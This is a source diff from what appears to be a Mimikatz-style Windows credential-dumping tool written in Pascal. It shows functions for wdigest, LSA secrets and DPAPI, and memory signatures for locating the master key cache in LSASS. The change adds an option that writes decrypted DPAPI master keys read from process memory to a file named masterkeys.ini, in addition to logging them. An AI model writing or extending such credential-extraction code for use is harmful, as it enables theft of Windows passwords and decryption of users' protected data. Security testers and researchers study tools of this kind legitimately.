@@ -18,7 +18,7 @@ function wdigest(pid:dword):boolean;
 function wdigest_UseLogonCredential(pid:dword):boolean;
 function wdigest_DisableCredGuard(pid:dword):boolean;
 
-function dpapi(pid:dword):boolean;
+function dpapi(pid:dword;save:boolean=false):boolean;
 
 function lsa_get_secret(server:string;key:string;var output:tbytes):boolean;
 function lsa_set_secret(const Server, KeyName,Password: string): Boolean;
@@ -933,7 +933,7 @@ result:=true;
 
 end;
 
-function dpapi(pid:dword):boolean;
+function dpapi(pid:dword;save:boolean=false):boolean;
 const
   PTRN_W2K3_MasterKeyCacheList:array [0..7] of byte= ($4d, $3b, $ee, $49, $8b, $fd, $0f, $85);
   PTRN_WI60_MasterKeyCacheList:array [0..7] of byte= ($49, $3b, $ef, $48, $8b, $fd, $0f, $84);
@@ -1168,6 +1168,8 @@ hprocess:=openprocess( PROCESS_VM_READ {or PROCESS_VM_WRITE or PROCESS_VM_OPERAT
                     then log('decryptLSA NOT OK',1)
                     else
                     begin
+                    if save
+                       then writeini(GUIDToString (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.KeyUid),'MasterKey',ByteToHexaString(decrypted),'masterkeys.ini');
                     log('MasterKey:'+ByteToHexaString(decrypted),1);
                     if crypto_hash_(CALG_SHA1, @decrypted[0], PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.keySize, dgst, SHA_DIGEST_LENGTH )
                        then log('SHA1:'+ByteToHexaString (dgst),1);
